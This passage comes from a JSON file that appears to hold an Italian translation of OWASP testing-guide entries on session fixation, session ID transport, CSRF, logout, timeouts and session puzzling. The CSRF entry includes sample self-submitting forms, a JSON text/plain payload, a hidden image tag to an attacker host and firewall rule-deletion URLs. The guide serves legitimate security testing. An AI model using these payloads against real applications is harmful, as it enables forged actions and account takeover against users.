      "tools": "<h3>Strumenti</h3><ul><li>Zed Attack Proxy (ZAP)</li><li>Web Proxy Burp Suite</li></ul><ul><li>Tamper Data for FF Quantum</li><li>FireSheep per Firefox</li><li>EditThisCookie per Chrome</li><li>Cookiebro - Cookie Manager per Firefox</li></ul><h3>Riferimenti</h3><ul><li>RFC 2965 - HTTP State Management Mechanism</li><li>RFC 2616 – Hypertext Transfer Protocol – HTTP 1.1</li><li>Same-Site Cookies - draft-ietf-httpbis-cookie-same-site-00</li><li>L’importante attributo “expires” di Set-Cookie</li><li>HttpOnly Session ID in URL e nel body della pagina</li><li>Internet Explorer Cookie Internals (FAQ)</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-SESS-03": {
      "summary": "<h3>Sommario</h3><p>La session fixation si verifica quando si mantiene in modo insicuro lo stesso valore dei cookie di sessione prima e dopo l’autenticazione. Questo accade tipicamente quando i cookie di sessione sono usati per memorizzare lo stato dell’utente anche prima del login, ad esempio per aggiungere prodotti al carrello prima di autenticarsi per il pagamento.</p><p>Nell’exploit tipico di vulnerabilità di session fixation, un attacker può ottenere un set di cookie di sessione dal sito target senza autenticarsi. L’attaccante può quindi forzare questi cookie nel browser della vittima tramite diverse tecniche. Se la vittima effettua il login e i cookie non vengono rigenerati dopo l’autenticazione, la vittima sarà identificata dai cookie scelti dall’attaccante, che potrà così impersonarla nella sessione.</p><p>Questo problema può essere risolto rigenerando i cookie di sessione dopo l’autenticazione. In alternativa, si può prevenire garantendo l’integrità dei cookie di sessione. Per attaccanti di rete (che controllano il canale usato dalla vittima), è necessario abilitare HSTS su tutto il dominio o aggiungere il prefisso __Host- / __Secure- al nome del cookie.</p><p>L’adozione completa di HSTS si ha quando un host attiva HSTS per sé e tutti i suoi sottodomini. Questo è descritto in “Testing for Integrity Flaws in Web Sessions” di Stefano Calzavara, Alvise Rabitti, Alessio Ragazzo, Michele Bugliesi.</p><h3>Obiettivi del test</h3><ul><li>Analizzare il meccanismo di autenticazione e il suo flusso.</li><li>Forzare i cookie e valutarne l’impatto.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>In questa sezione si spiega la strategia di test, che sarà dettagliata nella sezione successiva.</p><p>Il primo passo è fare una richiesta al sito da testare (es: www.example.com). Ad esempio:</p><pre><code>GET / HTTP/1.1\nHost: www.example.com</code></pre><p>Si otterrà una risposta come la seguente:</p><pre><code>HTTP/1.1 200 OK\nDate: Wed, 14 Aug 2008 08:45:11 GMT\nServer: IBM_HTTP_Server\nSet-Cookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1; Path=/; secure\nCache-Control: no-cache=\"set-cookie,set-cookie2\"\nExpires: Thu, 01 Dec 1994 16:00:00 GMT\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html;charset=Cp1254\nContent-Language: en-US</code></pre><p>L’applicazione imposta un nuovo session identifier, JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1, per il client.</p><p>Successivamente, se il tester si autentica correttamente sull’applicazione tramite un POST a https://www.example.com/authentication.php:</p><pre><code>POST /authentication.php HTTP/1.1\nHost: www.example.com\n[...]\nReferer: https://www.example.com\nCookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1\nContent-Type: application/x-www-form-urlencoded\nContent-length: 57\nName=Meucci&wpPassword=secret!&wpLoginattempt=Log+in</code></pre><p>Il tester osserva la risposta del server:</p><pre><code>HTTP/1.1 200 OK\nDate: Thu, 14 Aug 2008 14:52:58 GMT\nServer: Apache/2.2.2 (Fedora)\nX-Powered-By: PHP/5.1.6\nContent-language: en\nCache-Control: private, must-revalidate, max-age=0\nX-Content-Encoding: gzip\nContent-length: 4090\nConnection: close\nContent-Type: text/html; charset=UTF-8\n... HTML data ...</code></pre><p>Poiché dopo il login non viene rilasciato un nuovo cookie, il tester sa che è possibile effettuare session hijacking, a meno che non sia garantita l’integrità del cookie di sessione.</p><p>Il tester può inviare un session identifier valido a un utente (magari tramite social engineering), aspettare che si autentichi, e verificare poi che i privilegi vengano assegnati a quel cookie.</p><p>Questa strategia di test è orientata ad attaccanti di rete, quindi va applicata solo a siti senza HSTS completo (i siti con HSTS completo sono sicuri, perché tutti i cookie hanno integrità). Si assume di avere due account sul sito da testare, uno da vittima e uno da attaccante. Si simula lo scenario in cui l’attaccante forza nel browser della vittima tutti i cookie che non sono rigenerati dopo il login e privi di integrità. Dopo il login della vittima, l’attaccante presenta questi cookie al sito per accedere all’account della vittima: se basta per agire come la vittima, la session fixation è possibile.</p><p>Passaggi consigliati per eseguire il test:</p><p>Si raccomanda di usare due macchine o browser diversi per vittima e attaccante, riducendo i falsi positivi se l’applicazione usa fingerprinting sugli accessi. Una variante più rapida ma meno precisa prevede un solo account, seguendo la stessa sequenza fino al punto 6.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>ZAP</li></ul><h3>Riferimenti</h3><ul><li>Session Fixation</li><li>ACROS Security</li><li>Chris Shiflett</li></ul>",
      "remediation": "<h3>Remediation</h3><p>Implementare il rinnovo del session token dopo che un utente si è autenticato con successo.</p><p>L’applicazione dovrebbe sempre prima invalidare il session ID esistente prima dell’autenticazione e, se il login va a buon fine, fornire un nuovo session ID.</p>",
      "test_objectives": ""
    },
    "WSTG-SESS-04": {
      "summary": "<h3>Sommario</h3><p>I Session Token (Cookie, SessionID, Hidden Field), se esposti, permettono generalmente a un attacker di impersonare una vittima e accedere illegittimamente all’applicazione. È fondamentale proteggerli da intercettazioni in ogni momento, in particolare durante la trasmissione tra il browser client e i server dell’applicazione.</p><p>Le informazioni qui riportate riguardano come la transport security si applica al trasferimento dei dati sensibili di Session ID (piuttosto che ai dati in generale), e possono essere più restrittive delle policy di caching e trasporto applicate agli altri dati serviti dal sito.</p><p>Usando un proxy personale è possibile verificare per ogni richiesta e risposta:</p><ul><li>Protocollo utilizzato (es. HTTP vs. HTTPS)</li><li>HTTP Headers</li><li>Corpo del messaggio (es. POST o contenuto della pagina)</li></ul><p>Ogni volta che dati di Session ID vengono trasmessi tra client e server, bisogna esaminare protocollo, direttive di cache, privacy e body. Transport security si riferisce qui ai Session ID trasmessi in richieste GET o POST, corpi dei messaggi o altri mezzi su richieste HTTP valide.</p><h3>Obiettivi del test</h3><ul><li>Assicurarsi che sia implementata la cifratura adeguata.</li><li>Verificare la configurazione di caching.</li><li>Valutare la sicurezza dei canali e dei metodi di trasmissione.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>La protezione dall’intercettazione viene spesso fornita dalla cifratura TLS, ma può includere anche altri metodi di tunneling o encryption. Va sottolineato che la cifratura o hashing crittografico del Session ID va considerata separatamente dalla cifratura del trasporto: ciò che viene protetto è il Session ID stesso, non necessariamente i dati che può rappresentare.</p><p>Se un attacker può presentare un Session ID all’applicazione per ottenere accesso, esso deve essere protetto durante la trasmissione per mitigare il rischio. Bisogna quindi assicurarsi che la cifratura sia sempre la modalità predefinita e obbligatoria per ogni richiesta/risposta in cui viene trasmesso un Session ID, a prescindere dal meccanismo usato (ad esempio, hidden field in un form). Esempi di check includono la sostituzione di https:// con http:// durante l’interazione con l’applicazione, o la modifica dei form POST, per verificare se la separazione tra siti sicuri e non sicuri è ben implementata.</p><p>Se esiste una sezione del sito in cui l’utente viene tracciato con Session ID ma la sicurezza non è presente (ad esempio, il download di documenti pubblici da parte di un utente registrato), è essenziale usare un Session ID diverso. Il Session ID va monitorato mentre il client passa da elementi sicuri a non sicuri, per accertarsi che sia sempre differente.</p><p>Dopo un’autenticazione riuscita, l’utente dovrebbe aspettarsi di ricevere:</p><ul><li>Un nuovo session token diverso</li><li>Un token inviato sempre su canale cifrato ad ogni richiesta HTTP</li></ul><p>I proxy vanno considerati nella security review. Spesso i client accedono tramite proxy aziendali, ISP o altri gateway (come firewall). Il protocollo HTTP offre direttive per controllare il comportamento dei proxy downstream, la cui corretta implementazione deve essere verificata.</p><p>In generale, il Session ID non deve mai essere trasmesso su canale non cifrato né essere memorizzato nella cache. L’applicazione va esaminata per verificare che la comunicazione cifrata sia la default e sia obbligatoria per ogni trasferimento di Session ID. Inoltre, ogni volta che il Session ID è trasmesso, dovrebbero essere attive direttive per impedirne il caching da parte di cache intermedie o locali.</p><p>L’applicazione dovrebbe essere configurata per proteggere i dati nelle cache sia su HTTP/1.0 che HTTP/1.1 – la RFC 2616 descrive i controlli appropriati. HTTP/1.1 offre vari meccanismi di controllo cache. Cache-Control: no-cache indica che il proxy non deve riutilizzare alcun dato. Cache-Control: Private sembra adatto, ma consente comunque il caching su proxy non condivisi, rischioso ad esempio in ambienti condivisi (web-cafè, terminali condivisi). Anche su workstation singole, un Session ID in cache può essere esposto tramite compromissione del file-system o su network store. HTTP/1.0 non riconosce la direttiva Cache-Control: no-cache.</p><p>Le direttive Expires: 0 e Cache-Control: max-age=0 dovrebbero essere usate per assicurare che i dati non vengano esposti dalle cache. Ogni richiesta/risposta che veicola un Session ID va esaminata per assicurarsi che siano usate le direttive cache corrette.</p><p>In generale, non dovrebbero essere usate richieste GET, poiché il Session ID può essere esposto nei log di proxy o firewall, e sono molto più facilmente manipolabili. Va ricordato che qualsiasi meccanismo può essere manipolato dal client con gli strumenti adeguati. Gli attacchi Cross-site Scripting (XSS) sono più facili tramite link appositi verso la vittima, cosa meno probabile se i dati sono inviati con POST.</p><p>Tutto il codice server-side che riceve dati via POST deve essere testato per assicurarsi che non accetti i dati anche se inviati come GET. Esempio di richiesta POST ( https://owaspapp.com/login.asp ) generata da una pagina di login:</p><pre><code>POST /login.asp HTTP / 1.1 Host : owaspapp.com [...] Cookie : ASPSESSIONIDABCDEFG=ASKLJDLKJRELKHJG Content-Length : 51 Login=Username&password=Password&SessionID=12345678</code></pre><p>Se login.asp è mal implementato, potrebbe essere possibile loggarsi usando l’URL: https://owaspapp.com/login.asp?Login=Username&password=Password&SessionID=12345678</p><p>Script server-side potenzialmente insicuri possono essere individuati verificando ogni POST in questo modo.</p><p>Tutte le interazioni tra Client e Application devono essere testate almeno sui seguenti criteri:</p><ul><li>Come vengono trasmessi i Session ID? (es: GET, POST, form field, hidden field)</li><li>I Session ID sono sempre inviati su trasporto cifrato per default?</li><li>È possibile manipolare l’applicazione per trasmettere Session ID senza cifratura (ad esempio passando da HTTPS a HTTP)?</li><li>Quali direttive cache-control sono applicate alle richieste/risposte che trasportano Session ID?</li><li>Queste direttive sono sempre presenti? Dove ci sono eccezioni?</li><li>Vengono usate richieste GET con Session ID?</li><li>Se viene usato POST, è possibile sostituirlo con GET?</li></ul><h3>Riferimenti</h3><ul><li>RFCs 2109 e 2965 – HTTP State Management Mechanism - D. Kristol, L. Montulli</li><li>RFC 2616 – Hypertext Transfer Protocol - HTTP/1.1</li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-SESS-05": {
      "summary": "<h3>Sommario</h3><p>Il Cross-Site Request Forgery (CSRF) è un attacco che costringe un utente finale ad eseguire azioni indesiderate su una web application su cui è già autenticato. Con un po’ di social engineering (ad esempio inviando un link via email o chat), un attacker può costringere gli utenti di una web application a eseguire azioni a sua scelta. Un exploit CSRF riuscito può compromettere i dati dell’utente e le operazioni se la vittima è un utente normale. Se la vittima è un amministratore, l’attacco CSRF può compromettere l’intera applicazione.</p><p>CSRF si basa su:</p><p>I punti 1, 2 e 3 sono essenziali perché la vulnerabilità sia presente, mentre il punto 4 facilita lo sfruttamento ma non è strettamente richiesto.</p><p>Per semplicità, consideriamo URL accessibili via GET (anche se il discorso vale anche per le richieste POST). Se la vittima è già autenticata, inviare una nuova richiesta fa sì che il cookie venga inviato automaticamente. La figura mostra l’utente che accede a un’applicazione su www.example.com.</p><p>Figura 4.6.5-1: Session Riding</p><br><p>La richiesta GET può essere inviata dall’utente in vari modi:</p><ul><li>Usando l’applicazione web</li><li>Digitando l’URL nel browser</li><li>Seguendo un link esterno</li></ul><p>L’applicazione non può distinguere tra queste modalità. In particolare, la terza può essere molto pericolosa. Esistono varie tecniche e vulnerabilità che possono camuffare la natura reale di un link. Il link può essere incorporato in un’email, in un sito malevolo o in un contenuto HTML di terze parti che punta a una risorsa dell’applicazione. Se l’utente clicca sul link, essendo già autenticato, il browser invierà la richiesta GET con le informazioni di autenticazione (es. cookie di sessione). Ciò può portare all’esecuzione di un’operazione imprevista, ad esempio un trasferimento di denaro in un’app bancaria.</p><p>Usando un tag img, come nel punto 4, non è nemmeno necessario che l’utente clicchi su un link. Se l’attacker invia un’email con un link a una pagina contenente il seguente HTML semplificato:</p><pre><code><html> <body> ... <img src= \"https://www.company.example/action\" width= \"0\" height= \"0\" > ... </body> </html></code></pre><p>Quando il browser visualizza la pagina, proverà a caricare l’immagine specificata da https://www.company.example, inviando automaticamente una richiesta all’applicazione web. Non importa se l’URL non punta a un’immagine valida, la presenza dell’attributo src attiva comunque la richiesta. Questo succede finché il download delle immagini non è disabilitato nel browser (evento raro).</p><p>Il problema nasce dal fatto che:</p><ul><li>I tag HTML come img generano richieste HTTP automatiche.</li><li>Il browser non ha modo di distinguere se la risorsa referenziata è una vera immagine.</li><li>Il caricamento delle immagini avviene indipendentemente dalla provenienza (form e immagine possono essere su host o dominio diversi).</li></ul><p>Il fatto che contenuti HTML estranei possano riferirsi a componenti dell’applicazione, unito al comportamento automatico del browser, abilita questa tipologia di attacco. Non è possibile bloccare completamente questa dinamica, se non rendendo impossibile per l’attacker interagire con le funzionalità dell’applicazione.</p><p>In ambienti integrati mail/browser, basta visualizzare un messaggio con il riferimento a un’immagine per eseguire una richiesta all’applicazione con i relativi cookie. Le email possono contenere URL apparentemente validi, come:</p><pre><code><img src= \"https://[attacker]/picture.gif\" width= \"0\" height= \"0\" ></code></pre><p>Qui [attacker] è un sito controllato dall’attacker. Con un meccanismo di redirect, può rimandare la vittima a https://[thirdparty]/action ed eseguire l’azione.</p><p>I cookie non sono l’unico esempio di informazione coinvolta. Anche applicazioni che usano autenticazione HTTP (Basic o altre), dove le credenziali sono note al browser, sono vulnerabili, dato che il browser le invia automaticamente. Non sono invece vulnerabili le autenticazioni via form, che avvengono una volta sola e generano informazioni di sessione (di solito un cookie).</p><p>Esempio: la vittima è loggata su una console web di gestione di un firewall. L’utente si autentica e la sessione è salvata su cookie.</p><p>Supponiamo che la console abbia una funzione che consente di cancellare una regola specifica tramite ID o tutte le regole impostando *. (Funzione pericolosa ma utile per l’esempio). La pagina di delete usa GET. Per cancellare la regola 1:</p><pre><code>https://[target]/fwmgt/delete?rule=1</code></pre><p>Per cancellare tutte le regole:</p><pre><code>https://[target]/fwmgt/delete?rule=*</code></pre><p>L’esempio, seppur ingenuo, mostra i rischi del CSRF.</p><p>Figura 4.6.5-2: Session Riding Firewall Management</p><br><p>Compilando il form e inserendo * si invia questa GET:</p><pre><code>https://www.company.example/fwmgt/delete?rule=*</code></pre><p>Questo cancella tutte le regole firewall.</p><p>Figura 4.6.5-3: Session Riding Firewall Management 2</p><br><p>L’utente può ottenere lo stesso risultato anche inviando manualmente l’URL, seguendo un link diretto o indiretto, oppure visitando una pagina con tag img che punta allo stesso URL.</p><p>In tutti questi casi, se l’utente è autenticato nella console di gestione, la richiesta avrà successo e modificherà la configurazione. Si possono immaginare attacchi verso applicazioni sensibili: offerte automatiche, bonifici, ordini, modifiche di componenti software critici, ecc.</p><p>Queste vulnerabilità possono essere sfruttate anche dietro firewall: basta che il link sia raggiungibile dalla vittima (non necessariamente dall’attacker). Vale anche per server web interni (intranet).</p><p>Applicazioni auto-vulnerabili, cioè usate sia come vettore che come target (come webmail), peggiorano lo scenario: l’utente è già loggato leggendo la mail, e l’app può permettere all’attacker di eseguire azioni come cancellare o inviare messaggi a nome della vittima.</p><h3>Obiettivi del test</h3><ul><li>Verificare se è possibile avviare richieste per conto dell’utente che non siano state da lui iniziate.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Auditare l’applicazione per capire se la session management è vulnerabile. Se si basa solo su valori client-side (disponibili al browser), allora l’app è vulnerabile. Per “client-side values” si intendono cookie e credenziali HTTP authentication (Basic, ecc., non la form-based che è autenticazione a livello applicativo).</p><p>Le risorse accessibili via GET sono facilmente vulnerabili, ma anche le POST possono essere automatizzate via JavaScript e sono quindi anch’esse vulnerabili. L’uso della POST da solo non basta a prevenire CSRF.</p><p>Esempio per POST:</p><pre><code><html> <body onload= 'document.CSRF.submit()' > <form action= 'https://targetWebsite/Authenticate.jsp' method= 'POST' name= 'CSRF' > <input type= 'hidden' name= 'name' value= 'Hacked' > <input type= 'hidden' name= 'password' value= 'Hacked' > </form> </body> </html></code></pre><p>Se la webapp usa JSON per la comunicazione browser-server, può essere un problema l’assenza di query parameter, indispensabili per le form self-submitting. Per aggirare il problema, si può usare una form auto-invio con payload JSON nei campi hidden, cambiando l’enctype a text/plain per inviare il payload così com’è. Il codice di exploit sarà simile:</p><pre><code><html> <body> <script> history . pushState ( '' , '' , ' / ' ) </script> <form action= 'https://victimsite.com' method= 'POST' enctype= 'text/plain' > <input type= 'hidden' name= '{\"name\":\"hacked\",\"password\":\"hacked\",\"padding\":\"' value= 'something\"}' /> <input type= 'submit' value= 'Submit request' /> </form> </body> </html></code></pre><p>La richiesta POST sarà così:</p><pre><code>POST / HTTP / 1.1 Host : victimsite.com Content-Type : text/plain {\"name\":\"hacked\",\"password\":\"hacked\",\"padding\":\"=something\"}</code></pre><p>Quando questi dati vengono inviati, il server accetterà i campi name e password e ignorerà quello padding se non necessario.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>ZAP</li><li>CSRF Tester</li><li>Pinata-csrf-tool</li></ul><h3>Riferimenti</h3><ul><li>Peter W: “Cross-Site Request Forgeries”</li><li>Thomas Schreiber: “Session Riding”</li><li>Oldest known post</li><li>Cross-site Request Forgery FAQ</li><li>A Most-Neglected Fact About Cross Site Request Forgery (CSRF)</li><li>Multi-POST CSRF</li><li>SANS Pen Test Webcast: Complete Application pwnage via Multi POST XSRF</li></ul>",
      "remediation": "<h3>Remediation</h3><ul><li>Vedi la OWASP CSRF Prevention Cheat Sheet per le misure di prevenzione.</li></ul>",
      "test_objectives": ""
    },
    "WSTG-SESS-06": {
      "summary": "<h3>Sommario</h3><p>La terminazione della sessione è una fase fondamentale del ciclo di vita di una sessione. Ridurre al minimo la durata dei session token diminuisce la probabilità di successo di un attacco di session hijacking. Si può considerare anche un controllo per prevenire altri attacchi come Cross Site Scripting e Cross Site Request Forgery, che spesso fanno affidamento su una sessione autenticata già attiva. Una terminazione della sessione non sicura aumenta la superficie di attacco per tutti questi scenari.</p><p>Una terminazione sicura della sessione richiede almeno questi elementi:</p><ul><li>Disponibilità di controlli nell’interfaccia utente che permettano il logout manuale.</li><li>Terminazione della sessione dopo un certo periodo di inattività (session timeout).</li><li>Invalidazione corretta dello stato di sessione lato server.</li></ul><p>Ci sono diversi problemi che possono impedire una terminazione efficace della sessione. In un’applicazione web sicura ideale, l’utente dovrebbe poter terminare la sessione in qualsiasi momento tramite l’interfaccia. Ogni pagina dovrebbe avere un pulsante di logout ben visibile. Funzioni di logout poco chiare o ambigue possono minare la fiducia dell’utente.</p><p>Un errore comune è impostare un nuovo session token lato client mentre lo stato lato server rimane attivo e può essere riutilizzato ripristinando il valore precedente del cookie di sessione. A volte viene mostrato solo un messaggio di conferma senza effettuare alcuna azione concreta: questo va evitato.</p><p>Alcuni framework web si basano solo sul cookie di sessione per identificare l’utente loggato, inserendo l’ID utente (anche cifrato) direttamente nel valore del cookie, senza alcun tracciamento server-side. Al logout il cookie viene rimosso dal browser, ma l’applicazione non può sapere se una sessione è stata chiusa o meno. Così riutilizzando un cookie di sessione è possibile ottenere di nuovo l’accesso alla sessione autenticata. Un esempio noto è la Forms Authentication di ASP.NET.</p><p>Spesso gli utenti chiudono semplicemente il browser o la scheda senza fare logout. Una web application dovrebbe prevedere questa situazione e terminare la sessione lato server dopo un tempo prestabilito.</p><p>L’uso di sistemi Single Sign-On (SSO) invece di uno schema di autenticazione specifico per applicazione porta spesso alla coesistenza di più sessioni che devono essere terminate separatamente. Ad esempio, terminare la sessione applicativa non termina la sessione SSO: tornando al portale SSO, l’utente può loggarsi nuovamente nell’applicazione da cui si era appena disconnesso. Al contrario, un logout dal sistema SSO non comporta necessariamente la terminazione della sessione nelle applicazioni collegate.</p><h3>Obiettivi del test</h3><ul><li>Valutare la UI del logout.</li><li>Analizzare il timeout di sessione e verificare che la sessione venga effettivamente distrutta dopo il logout.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Verificare la presenza e la visibilità della funzionalità di logout nell’interfaccia utente. Esaminare ogni pagina dal punto di vista di un utente intenzionato a disconnettersi dalla web application.</p><p>Caratteristiche di una buona UI di logout:</p><ul><li>Un pulsante di logout presente su tutte le pagine dell’applicazione.</li><li>Il pulsante di logout deve essere facilmente riconoscibile da chi vuole disconnettersi.</li><li>Dopo il caricamento della pagina il pulsante di logout dovrebbe essere visibile senza dover scorrere.</li><li>Idealmente il pulsante è posizionato in un’area fissa della pagina, sempre visibile anche scorrendo il contenuto.</li></ul><p>Prima di procedere, memorizzare i valori dei cookie utilizzati per identificare la sessione. Eseguire il logout e osservare il comportamento, in particolare rispetto ai cookie di sessione. Provare ad accedere a una pagina visibile solo a sessione autenticata (ad esempio tramite il tasto “indietro” del browser). Se viene mostrata una versione in cache, usare il reload per forzare il caricamento dal server. Se il logout imposta nuovi valori nei cookie di sessione, ripristinare i vecchi valori e provare a ricaricare una pagina dell’area autenticata. Se questi test non mostrano vulnerabilità su una pagina, provare anche su altre considerate critiche per la sicurezza, per assicurarsi che la terminazione sia riconosciuta ovunque.</p><p>Nessun dato riservato dovrebbe essere visibile durante questi test. Idealmente l’applicazione dovrebbe reindirizzare l’utente a una pagina pubblica o al form di login quando si tenta di accedere a un’area autenticata dopo la terminazione della sessione. Non è indispensabile per la sicurezza, ma sovrascrivere i cookie di sessione dopo il logout è comunque una buona pratica.</p><p>Cercare di determinare il session timeout eseguendo richieste all’area autenticata con intervalli crescenti. Se compare il comportamento di logout, il ritardo usato corrisponde approssimativamente al valore di timeout di sessione.</p><p>Gli stessi risultati attesi per la terminazione server-side valgono anche in caso di logout per timeout da inattività.</p><p>Il valore corretto del timeout dipende dallo scopo dell’applicazione e deve essere un compromesso tra sicurezza e usabilità. In una banca, una sessione inattiva oltre 15 minuti non ha senso; in un wiki o forum un timeout troppo breve può infastidire utenti che scrivono testi lunghi. In questi casi, timeout di un’ora o più sono accettabili.</p><p>Eseguire il logout nell’applicazione testata. Verificare se esiste un portale centrale o una directory applicativa che permette di rientrare nell’applicazione senza autenticazione. Provare se, dopo aver richiesto l’URL di un entry point, viene chiesta una nuova autenticazione. Dopo il logout nell’applicazione testata, effettuare anche il logout nel sistema SSO, quindi tentare di accedere a un’area autenticata dell’applicazione.</p><p>È atteso che l’invocazione del logout su una web application collegata a un sistema SSO, o direttamente sul sistema SSO, comporti la terminazione globale di tutte le sessioni. Dovrebbe essere richiesta una nuova autenticazione dopo il logout, sia per il sistema SSO che per le applicazioni collegate.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>Burp Suite - Repeater</li></ul><h3>Riferimenti</h3><ul><li>Cookie replay attacks in ASP.NET when using forms authentication</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-SESS-07": {
      "summary": "<h3>Sommario</h3><p>In questa fase i tester verificano che l'applicazione esegua automaticamente il logout di un utente quando questi è rimasto inattivo per un certo periodo di tempo, assicurandosi che non sia possibile 'riutilizzare' la stessa sessione e che nessun dato sensibile rimanga memorizzato nella cache del browser.</p><p>Tutte le applicazioni dovrebbero implementare un timeout di inattività per le sessioni. Questo timeout definisce quanto tempo una sessione rimarrà attiva in assenza di attività da parte dell’utente, chiudendo e invalidando la sessione dopo il periodo di inattività definito a partire dall’ultima richiesta HTTP ricevuta dall’applicazione web per un determinato session ID. Il timeout più appropriato dovrebbe essere un compromesso tra sicurezza (timeout più breve) e usabilità (timeout più lungo), e dipende molto dal livello di sensibilità dei dati gestiti dall’applicazione. Ad esempio, un logout dopo 60 minuti può essere accettabile per un forum pubblico, ma un tempo così lungo sarebbe eccessivo in un’applicazione di home banking (dove è raccomandato un timeout massimo di 15 minuti). In ogni caso, qualsiasi applicazione che non imponga un logout basato su timeout dovrebbe essere considerata non sicura, a meno che tale comportamento sia richiesto da specifici requisiti funzionali.</p><p>Il timeout di inattività limita le possibilità che un attaccante abbia di indovinare e utilizzare un session ID valido di un altro utente e, in alcune circostanze, può proteggere i computer pubblici dal riutilizzo della sessione. Tuttavia, se l’attaccante riesce a compromettere una determinata sessione, il timeout di inattività non limita le sue azioni, poiché può generare attività periodica sulla sessione per mantenerla attiva più a lungo.</p><p>La gestione del timeout e la scadenza della sessione devono essere applicate lato server. Se alcuni dati sotto il controllo del client vengono utilizzati per gestire il timeout di sessione, ad esempio utilizzando valori di cookie o altri parametri client per tracciare riferimenti temporali (es. minuti trascorsi dall’accesso), un attaccante potrebbe manipolarli per estendere la durata della sessione. Quindi, l’applicazione deve tracciare il tempo di inattività lato server e, dopo la scadenza del timeout, invalidare automaticamente la sessione corrente dell’utente e cancellare tutti i dati memorizzati sul client.</p><p>Entrambe le azioni devono essere implementate con attenzione, per evitare di introdurre debolezze che un attaccante potrebbe sfruttare per ottenere accesso non autorizzato se l’utente si dimentica di fare logout dall’applicazione. In particolare, come per la funzione di logout, è importante assicurarsi che tutti i token di sessione (es. cookie) siano correttamente distrutti o resi inutilizzabili, e che siano applicati controlli lato server per prevenire il riutilizzo dei token di sessione. Se queste azioni non vengono eseguite correttamente, un attaccante potrebbe ripetere l’invio di questi token di sessione per 'resuscitare' la sessione di un utente legittimo e impersonarlo (questo attacco è noto come 'cookie replay'). Ovviamente, un fattore mitigante è che l’attaccante debba essere in grado di accedere a tali token (che sono memorizzati sul PC della vittima), ma in molti casi ciò non è impossibile o particolarmente difficile.</p><p>Lo scenario più comune per questo tipo di attacco è un computer pubblico usato per accedere a informazioni private (es. webmail, conto bancario online). Se l’utente si allontana dal computer senza eseguire il logout e il timeout di sessione non è implementato, un attaccante potrebbe accedere allo stesso account semplicemente premendo il pulsante 'indietro' del browser.</p><h3>Obiettivi del test</h3><ul><li>Verificare che esista un timeout di sessione effettivo.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Lo stesso approccio visto nella sezione sul test della funzionalità di logout può essere applicato anche per la misurazione del logout per timeout.<br>La metodologia di test è molto simile. Prima di tutto, i tester devono verificare se esiste un timeout, ad esempio, effettuando il login e aspettando che venga attivato il logout automatico. Come per la funzione di logout, dopo che il timeout è scaduto, tutti i token di sessione dovrebbero essere distrutti o resi inutilizzabili.</p><p>Successivamente, se il timeout è configurato, i tester devono capire se viene applicato dal client o dal server (o da entrambi). Se il cookie di sessione non è persistente (o, più in generale, non memorizza alcun dato temporale), si può presumere che il timeout sia gestito dal server. Se il cookie di sessione contiene informazioni temporali (es. data e ora di login, ultimo accesso, scadenza per cookie persistenti), allora è possibile che il client sia coinvolto nella gestione del timeout. In questo caso, i tester potrebbero provare a modificare il cookie (se non è protetto crittograficamente) e vedere cosa succede alla sessione. Ad esempio, possono impostare la scadenza del cookie molto in avanti e verificare se la sessione può essere prolungata.</p><p>In generale, tutto dovrebbe essere verificato lato server e non dovrebbe essere possibile, reimpostando i cookie di sessione ai valori precedenti, accedere nuovamente all’applicazione.</p><p>Il tester deve verificare che:</p><ul><li>La funzione di logout distrugga effettivamente tutti i token di sessione, o almeno li renda inutilizzabili,</li><li>Il server esegua controlli appropriati sullo stato della sessione, impedendo a un attaccante di ripetere identificatori di sessione già distrutti,</li><li>Un timeout sia applicato e correttamente gestito dal server. Se il server utilizza un tempo di scadenza letto da un token di sessione inviato dal client (cosa non raccomandata), allora il token deve essere protetto crittograficamente da manomissioni.</li></ul><p>Nota che la cosa più importante è che l’applicazione invalidi la sessione lato server. Generalmente ciò significa che il codice deve richiamare i metodi appropriati, ad esempio <code>HttpSession.invalidate()</code> in Java e <code>Session.abandon()</code> in .NET. Cancellare i cookie dal browser è consigliabile, ma non strettamente necessario, poiché se la sessione è stata invalidata correttamente lato server, avere il cookie nel browser non aiuterà un attaccante.</p><h3>Riferimenti</h3><ul><li>Session Management Cheat Sheet</li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-SESS-08": {
      "summary": "<h3>Riassunto</h3><p>Il Session Variable Overloading (noto anche come Session Puzzling) è una vulnerabilità a livello applicativo che può permettere a un attaccante di eseguire diverse azioni malevole, tra cui, ma non solo:</p><ul><li>Bypassare i meccanismi di autenticazione efficienti e impersonare utenti legittimi.</li><li>Elevare i privilegi di un account malevolo, anche in ambienti che sarebbero considerati a prova di errore.</li><li>Saltare fasi di qualificazione in processi multi-fase, anche se il processo include tutte le restrizioni di sicurezza raccomandate a livello di codice.</li><li>Manipolare valori lato server in modo indiretto, in maniera non prevedibile o rilevabile.</li><li>Eseguire attacchi tradizionali in punti prima non raggiungibili o ritenuti sicuri.</li></ul><p>Questa vulnerabilità si verifica quando un’applicazione utilizza la stessa variabile di sessione per più di uno scopo. Un attaccante può accedere alle pagine in un ordine non previsto dagli sviluppatori, in modo che la variabile di sessione venga valorizzata in un contesto e poi usata in un altro.</p><p>Ad esempio, un attaccante potrebbe sfruttare il session variable overloading per bypassare i meccanismi di autenticazione che validano semplicemente l’esistenza di variabili di sessione contenenti valori relativi all’identità, solitamente salvati nella sessione dopo un’autenticazione avvenuta con successo. In pratica, un attaccante accede prima a una parte dell’applicazione che imposta il contesto di sessione e poi a pagine privilegiate che verificano tale contesto.</p><p>Un vettore di attacco classico può consistere nell’accedere a un punto di ingresso pubblico (es: una pagina di recupero password) che popola la sessione con una variabile identica, basandosi su valori fissi o input fornito dall’utente.</p><h3>Obiettivi del 